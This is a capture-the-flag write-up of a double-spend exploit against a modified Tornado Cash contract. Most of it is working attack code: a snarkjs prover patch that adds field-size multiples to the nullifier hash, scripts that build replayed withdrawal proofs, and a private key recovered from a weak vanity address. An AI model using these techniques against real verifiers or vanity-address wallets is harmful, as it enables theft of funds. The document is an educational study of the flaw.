# OFAC Executive Order 13337: Tornado Cash FFlonk Public Input Malleability

In this CTF challenge, we explore a vulnerability in a modified version of the Tornado Cash protocol. The challenge demonstrates how field element validation assumptions in zero-knowledge proof systems can lead to public input malleability and double-spending attacks.

## Challenge Overview

The challenge presents us with a modified version of the Tornado Cash protocol where:
- The original Groth16 verifier has been replaced with a FFlonk verifier
- An OFAC whitelist check has been added to restrict withdrawals
- The protocol contains 10 ETH that must be completely drained to win
- The withdrawal mechanism should prevent double-spending via nullifier hashes

The system implements several standard security measures:
- Zero-knowledge proofs to maintain privacy
- Nullifier hashes to prevent double-spending
- Merkle trees for commitment storage
- Whitelist-based access control

The challenge setup provides players with:
- Modified Tornado Cash smart contracts
- A pregenerated zkey file for the FFlonk verifier
- An OFAC whitelist contract
- A profanity address (0x000FacC43F939Df4B423A90F02641a2D7C95A937) as the regulator

The goal is to drain all 10 ETH from the contract. This should be impossible under normal circumstances, as:
1. Each deposit can only be withdrawn once due to nullifier tracking
2. Only whitelisted addresses can perform withdrawals
3. The core Tornado Cash protocol has been battle-tested

## Initial Code Analysis

Let's examine the core mechanics and key modifications in detail.

### Key Modifications

The most significant changes from the original Tornado Cash implementation are:

```solidity
modifier onlyOFACWhitelisted(){
  require(OFACWhitelist.whitelist(msg.sender), "this caller is blocked by OFAC");
  _;
}

function _processWithdraw(
  address payable _recipient,
  address payable _relayer,
  uint256 _fee,
  uint256 _refund
) onlyOFACWhitelisted internal override {
  // ...original withdrawal logic...
}
```

Key observations:
1. The OFAC whitelist is a simple mapping controlled by a regulator address
2. The regulator address appears to be a vanity/profanity address
3. The core Tornado Cash logic remains unchanged except for the verifier

## Finding the Vulnerability

After analyzing the challenge setup and modifications to the original Tornado Cash protocol, two key problems needed to be solved:

1. Bypassing the OFAC whitelist
2. Finding a way to withdraw more ETH than deposited

The OFAC whitelist contract was found to be simple and seemingly bug-free. However, the presence of a profanity address (0x000FacC43F939Df4B423A90F02641a2D7C95A937) as the regulator suggested a potential vulnerability in the address generation process.

For the second problem, looking at the TornadoCash contracts, given their widespread use and battle-testing, we assumed the vulnerability must lie in the new code - specifically the FFlonk Verifier. The challenge author confirmed that the original TornadoCash circuits were used unchanged, which helped narrow down the search to the verifier implementation.

### FFlonk Verifier Analysis

The key insight came from examining the assumptions made by TornadoCash versus those made by the FFlonk verifier. TornadoCash assumes that the nullifier hash public inputs are not malleable - each withdrawal should have a unique nullifier hash. However, the FFlonk verifier's implementation of public input handling revealed a critical oversight.

The most interesting component is the FFlonk verifier's handling of public inputs:

```solidity
function computePi(pMem, pPub) {
    let pi := 0
    pi := mod(add(sub(pi, mulmod(mload(add(pMem, pEval_l1)), calldataload(pPub), q)), q), q)
    // ... similar operations for other public inputs ...
    mstore(add(pMem, pPi), pi)
}
```

Critical aspects:
1. Public inputs are used in modular arithmetic operations
2. No explicit bounds checking on input values
3. The modulus q is the size of the scalar field

### Summary

Two key vulnerabilities emerge from this analysis:

1. The OFAC regulator address was potentially generated using a vulnerable profanity address generator
2. The FFlonk verifier lacks proper bounds checking on public inputs

The most interesting aspect is how the FFlonk verifier's handling of public inputs differs from the original protocol's assumptions. While the nullifier hash is meant to be unique per withdrawal, the verifier's modular arithmetic allows for malleability of public inputs.

## The Exploit

Let's break down the attack step by step.

### Exploit Setup

The exploit requires:
1. Recovering the private key for the OFAC regulator address
2. Modifying the snarkjs FFlonk prover to exploit public input malleability
3. Generating multiple valid proofs for the same deposit

First, we try to recover the regulator's private key using an open-source tool (https://github.com/rebryk/profanity-brute-force). This works and gives us the private key:
```
Private Key: 0x3e26b176b011d9a958e00744cf25bf77163465195861727d2f88ceb02d8f1578
```

### Attack Flow

To implement the exploit, we first need to generate witnesses and commitments for our deposits. This is done using the following helper functions:

```javascript
async function make_witness(recipient, relayer, fee, refund, nullifier, secret, leaves, output) {
  // Get nullifier hash
  const nullifierHash = await pedersenHash(leBigintToBuffer(nullifier, 31));

  const tree = await mimicMerkleTree(leaves);

  const commitment = await pedersenHash(
    Buffer.concat([
      leBigintToBuffer(nullifier, 31),
      leBigintToBuffer(secret, 31),
    ])
  );
  const merkleProof = tree.proof(commitment);

  // Format witness input to match circuit expectations
  const input = {
    // Public inputs
    root: merkleProof.pathRoot,
    nullifierHash: nullifierHash,
    recipient: recipient,
    relayer: relayer,
    fee: fee,
    refund: refund,

    // Private inputs
    nullifier: nullifier,
    secret: secret,
    pathElements: merkleProof.pathElements.map((x) => x.toString()),
    pathIndices: merkleProof.pathIndices,
  };

  await snarkjs.wtns.calculate(
    input,
    "withdraw.wasm",
    output,
  );
}
```

Then we generate a set of witnesses and commitments:

```javascript
const witnesses = ["wtns1", "wtns2", "wtns3"];
const commitments = [];

for (let wtns of witnesses) {
  const nullifier = rbigint(31);
  const secret = rbigint(31);
  
  const commitment = await pedersenHash(
    Buffer.concat([
      leBigintToBuffer(nullifier, 31),
      leBigintToBuffer(secret, 31),
    ])
  );
  commitments.push(commitment);

  const recipient = hexToBigint("0x000FacC43F939Df4B423A90F02641a2D7C95A937");
  await make_witness(recipient, 0n, 0n, 0n, nullifier, secret, commitments, wtns);
}
```

With our witnesses prepared, we can now execute the main stages of the attack:

1. Modify the snarkjs FFlonk prover to add a multiple of the field size to public inputs (the multiplier is passed as an additional argument to fflonkProve):
```diff
     buffWitness.set(Fr.zero, 0);
     const buffInternalWitness = new BigBuffer(zkey.nAdditions * sFr);

+    buffWitness.set(
+      leBigintToBuffer(
+        leBufferToBigint(buffWitness.slice(2 * sFr, 2 * sFr + sFr)) + 21888242871839275222246405745257275088548364400416034343698204186575808495617n * hack,
+        sFr,
+      ),
+      2 * sFr,
+    );
...
         // Add A to the transcript
         for (let i = 0; i < zkey.nPublic; i++) {
-            transcript.addScalar(buffers.A.slice(i * sFr, i * sFr + sFr));
+            if (i === 1) {
+                transcript.addRaw(beBigintToBuffer(leBufferToBigint(buffWitness.slice(2 * sFr, 2 * sFr + sFr)), sFr));
+            } else {
+                transcript.addScalar(buffers.A.slice(i * sFr, i * sFr + sFr));
+            }
         }
```

2. Generate multiple withdraw proofs for each deposit by manipulating the nullifier hash by adding a multiple of the scalar field size:
```javascript
for (let i = 0; i < commitments.length; i++) {
  // Make deposit
  const commitment = commitments[i];
  output += `tornado.deposit{value: 1 ether}(0x${commitment.toString(16)});\n`;
  
  // Generate 5 different proofs for the same deposit
  for (let n = 0n; n < 5n; n++) {
    const { proof, publicSignals } = await fflonk.prove(zkey_path, wtns, undefined, undefined, n);
    // ... format proof for contract call ...
  }
}
```

3. Generate the exploit transactions as solidity code:

```javascript
for (let i = 0; i < commitments.length; i++) {
  const commitment = commitments[i];
  const wtns = witnesses[i];
  let output = `tornado.deposit{value: 1 ether}(0x${commitment.toString(16)});\n`;
  
  for (let n = 0n; n < 5n; n++) {
    const { proof: _proof, publicSignals: _pub } = await fflonk.prove(zkey_path, wtns, undefined, undefined, n);
    const proof = unstringifyBigInts(_proof);
    const publicSignals = unstringifyBigInts(_pub);
    
    // Format proof elements for contract call
    const elems = [
      proof.polynomials.C1[0], proof.polynomials.C1[1],
      proof.polynomials.C2[0], proof.polynomials.C2[1],
      proof.polynomials.W1[0], proof.polynomials.W1[1],
      proof.polynomials.W2[0], proof.polynomials.W2[1],
      proof.evaluations.ql, proof.evaluations.qr,
      // ... additional proof elements ...
    ];
    
    output += formatWithdrawCall(elems, publicSignals);
  }
  console.log(output);
}
```

4. Execute the withdrawals in sequence:
- Add our address to whitelist using recovered private key
- Make 3 deposits of 1 ETH each
- Perform 5 withdrawals per deposit using the generated malleable proofs
- Successfully drain all 10 ETH from the contract

The withdrawal proofs are valid because adding multiples of the field size to the nullifier hash preserves the modular equivalence in the verifier's computations while producing distinct values for the contract's nullifier tracking.

### Why It Works

The exploit succeeds because:
1. The FFlonk verifier only uses public inputs in modular arithmetic operations
2. Adding the field size to a public input preserves the modular equivalence
3. The transcript includes the modified public input, maintaining proof validity
4. The contract tracks nullifiers using the malleable value rather than the original

## Complete Scripts

snarkjs.patch

```diff
diff --git a/src/Keccak256Transcript.js b/src/Keccak256Transcript.js
index ab3d227..6b34e06 100644
--- a/src/Keccak256Transcript.js
+++ b/src/Keccak256Transcript.js
@@ -23,6 +23,7 @@ const { keccak256 } = jsSha3;

 const POLYNOMIAL = 0;
 const SCALAR = 1;
+const RAW = 2;

 export class Keccak256Transcript {
     constructor(curve) {
@@ -44,6 +45,10 @@ export class Keccak256Transcript {
         this.data.push({type: SCALAR, data: scalar});
     }

+    addRaw(data) {
+        this.data.push({type: RAW, data: data});
+    }
+
     getChallenge() {
         if(0 === this.data.length) {
             throw new Error("Keccak256Transcript: No data to generate a transcript");
@@ -61,13 +66,16 @@ export class Keccak256Transcript {
             if (POLYNOMIAL === this.data[i].type) {
                 this.G1.toRprUncompressed(buffer, offset, this.data[i].data);
                 offset += this.G1.F.n8 * 2;
-            } else {
+            } else if (SCALAR === this.data[i].type) {
                 this.Fr.toRprBE(buffer, offset, this.data[i].data);
                 offset += this.Fr.n8;
+            } else {
+                buffer.set(this.data[i].data, offset);
+                offset += this.Fr.n8;
             }
         }

         const value = Scalar.fromRprBE(new Uint8Array(keccak256.arrayBuffer(buffer)));
         return this.Fr.e(value);
     }
diff --git a/src/fflonk_prove.js b/src/fflonk_prove.js
index 3fb820d..a70985e 100644
--- a/src/fflonk_prove.js
+++ b/src/fflonk_prove.js
@@ -111,6 +151,14 @@ export default async function fflonkProve(zkeyFileName, witnessFileName, logger,
     buffWitness.set(Fr.zero, 0);
     const buffInternalWitness = new BigBuffer(zkey.nAdditions * sFr);

+    buffWitness.set(
+      leBigintToBuffer(
+        leBufferToBigint(buffWitness.slice(2 * sFr, 2 * sFr + sFr)) + 21888242871839275222246405745257275088548364400416034343698204186575808495617n * hack,
+        sFr,
+      ),
+      2 * sFr,
+    );
+
     let buffers = {};
     let polynomials = {};
     let evaluations = {};
@@ -530,7 +578,11 @@ export default async function fflonkProve(zkeyFileName, witnessFileName, logger,

         // Add A to the transcript
         for (let i = 0; i < zkey.nPublic; i++) {
-            transcript.addScalar(buffers.A.slice(i * sFr, i * sFr + sFr));
+            if (i === 1) {
+                transcript.addRaw(beBigintToBuffer(leBufferToBigint(buffWitness.slice(2 * sFr, 2 * sFr + sFr)), sFr));
+            } else {
+                transcript.addScalar(buffers.A.slice(i * sFr, i * sFr + sFr));
+            }
         }

         // Add C1 to the transcript
```

generate-commitments-and-witnesses.js

```javascript
const path = require("path");
const snarkjs = require("snarkjs");
const { ethers } = require("ethers");
const { pedersenHash } = require("./utils/pedersen.js");
const { mimicMerkleTree } = require("./utils/mimcMerkleTree.js");
const { rbigint, hexToBigint, bigintToHex, leBigintToBuffer } = require("./utils/bigint.js");

async function make_witness(recipient, relayer, fee, refund, nullifier, secret, leaves, output) {
  // 2. Get nullifier hash
  const nullifierHash = await pedersenHash(leBigintToBuffer(nullifier, 31));

  const tree = await mimicMerkleTree(leaves);

  const commitment = await pedersenHash(
    Buffer.concat([
      leBigintToBuffer(nullifier, 31),
      leBigintToBuffer(secret, 31),
    ])
  );
  const merkleProof = tree.proof(commitment);

  // 4. Format witness input to exactly match circuit expectations
  const input = {
    // Public inputs
    root: merkleProof.pathRoot,
    nullifierHash: nullifierHash,
    recipient: recipient,
    relayer: relayer,
    fee: fee,
    refund: refund,

    // Private inputs
    nullifier: nullifier,
    secret: secret,
    pathElements: merkleProof.pathElements.map((x) => x.toString()),
    pathIndices: merkleProof.pathIndices,
  };

  await snarkjs.wtns.calculate(
    input,
    path.join(__dirname, "../circuit_artifacts/withdraw_js/withdraw.wasm"),
    output,
  );
}

async function main() {
  const witnesses = [
    "wtns1",
    "wtns2",
    "wtns3",
  ];
  const commitments = [];

  for (let wtns of witnesses) {
    // 1. Generate random nullifier and secret
    const nullifier = rbigint(31);
    const secret = rbigint(31);

    // 2. Get commitment
    const commitment = await pedersenHash(
      Buffer.concat([
        leBigintToBuffer(nullifier, 31),
        leBigintToBuffer(secret, 31),
      ])
    );
    commitments.push(commitment);

    const recipient = hexToBigint("0x000FacC43F939Df4B423A90F02641a2D7C95A937");
    const relayer = 0n;
    const fee = 0n;
    const refund = 0n;

    await make_witness(recipient, relayer, fee, refund, nullifier, secret, commitments, wtns);
    console.log(wtns, bigintToHex(commitment))
  }
}

main()
  .then(() => {
    process.exit(0);
  })
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
```

build-exploit.js

```javascript
import { fflonk } from '../main.js';
import {utils} from "ffjavascript";
const {unstringifyBigInts} = utils;

const zkey_path = "../tornado-cash-rebuilt/circuit.zkey";
const commitments = [
  0x282772198f1e1c2b93e4ce0e19d55cf24d1258e4b0e47b32ab4c3ffd32592929n,
  0x2ea44fb17a4c3da40579cdffee865ebe005aaf1292e3e7a22b5b5bbffd31dee9n,
  0x18829f6cd6089275106b5d863b35cc28f9b51ca48077aa472014f6a2afed3676n,
];
const witnesses = [
  "../tornado-cash-rebuilt/wtns1",
  "../tornado-cash-rebuilt/wtns2",
  "../tornado-cash-rebuilt/wtns3",
];

for (let i = 0; i < commitments.length; i++) {
  const commitment = commitments[i];
  const wtns = witnesses[i];
  let output = `tornado.deposit{value: 1 ether}(0x${commitment.toString(16)});
`;
  for (let n = 0n; n < 5n; n++) {
    console.log(`Proving ${n} of 5 for commitment ${i}`)
    const { proof: _proof, publicSignals: _pub } = await fflonk.prove(zkey_path, wtns, undefined, undefined, n);
    const proof = unstringifyBigInts(_proof);
    const publicSignals = unstringifyBigInts(_pub);
    const elems = [
      proof.polynomials.C1[0],
      proof.polynomials.C1[1],
      proof.polynomials.C2[0],
      proof.polynomials.C2[1],
      proof.polynomials.W1[0],
      proof.polynomials.W1[1],
      proof.polynomials.W2[0],
      proof.polynomials.W2[1],
      proof.evaluations.ql,
      proof.evaluations.qr,
      proof.evaluations.qm,
      proof.evaluations.qo,
      proof.evaluations.qc,
      proof.evaluations.s1,
      proof.evaluations.s2,
      proof.evaluations.s3,
      proof.evaluations.a,
      proof.evaluations.b,
      proof.evaluations.c,
      proof.evaluations.z,
      proof.evaluations.zw,
      proof.evaluations.t1w,
      proof.evaluations.t2w,
      proof.evaluations.inv,
    ];
    const proofArray = elems.map(n => `bytes32(uint256(0x${n.toString(16)}))`).join(",\n");
    output += `
  {
      bytes32[24] memory proof = [
  ${proofArray}
      ];
      tornado.withdraw(
          proof,
          bytes32(uint256(0x${publicSignals[0].toString(16)})),
          bytes32(uint256(0x${publicSignals[1].toString(16)})),
          payable(address(0x${publicSignals[2].toString(16)})),
          payable(address(0x${publicSignals[3].toString(16)})),
          ${publicSignals[4].toString(10)},
          ${publicSignals[5].toString(10)}
      );
  }
  `;
  }
  console.log(output);
}

process.exit(0);
```

## Key Takeaways

1. Zero-knowledge proof systems must validate public inputs are within the scalar field
2. Protocol assumptions about uniqueness must be enforced at all layers
3. Changing cryptographic primitives requires careful consideration of their security properties
4. Vanity/profanity address generators may introduce critical vulnerabilities

This challenge demonstrates how assumptions about public input uniqueness in zero-knowledge proof systems can be violated when verifiers don't properly validate input bounds, leading to double-spending vulnerabilities even in well-tested protocols. It also highlights the importance of secure vanity address generation, as seemingly cosmetic features can introduce critical security vulnerabilities when implemented incorrectly.